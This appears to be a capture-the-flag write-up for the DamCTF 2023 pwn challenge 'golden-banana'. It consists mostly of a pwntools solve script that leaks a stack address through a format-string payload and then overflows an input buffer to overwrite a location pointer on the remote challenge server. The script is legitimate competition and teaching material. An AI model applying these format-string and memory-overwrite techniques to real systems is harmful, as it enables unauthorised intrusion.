# golden-banana (pwn)

Full writeup here: https://rektedekte.github.io/CTF-writeups/DamCTF%202023/golden-banana/

Our solve script:

```py
from pwn import *

elf = context.binary = ELF("./golden_banana")

context.gdbinit = "~/tools/peda/peda.py"
# conn = gdb.debug("./golden_banana", '''
# b *(&main+189)
# c
# ''')

# conn = process("./golden_banana")
conn = connect("chals.damctf.xyz", 30234)

conn.recvuntil(b"south\n")
conn.sendline(b"1")  # Navigate to location 1

conn.recvuntil(b"back\n")
conn.sendline(b"2")  # Navigate to location 4

payload = b"\x00" * 6184  # Padding until north description
payload += b"%p"  # First stack value is a stack pointer

conn.recvuntil(b"south\n")
conn.sendline(payload)  # Overwrite location 1's description

leak = eval(conn.recvline().split(b"1:")[0])
print(f"Leaked stack address {hex(leak)}")

gets_start = leak - 0x58a0  # Address input buffer
target_address = leak - 0x3878  # Address of location 1, choice 1 (location pointer)
target_pointer = leak + 0xd9b8  # Address of secret room

print(f"Writing {hex(target_pointer)} to {hex(target_address)}")

padding = target_address - gets_start
payload = b"\x00" * padding
payload += p64(target_pointer)

conn.recvuntil(b"back\n")
conn.sendline(payload)  # We don't need to specify room choice: find_match figures it out

conn.interactive()
```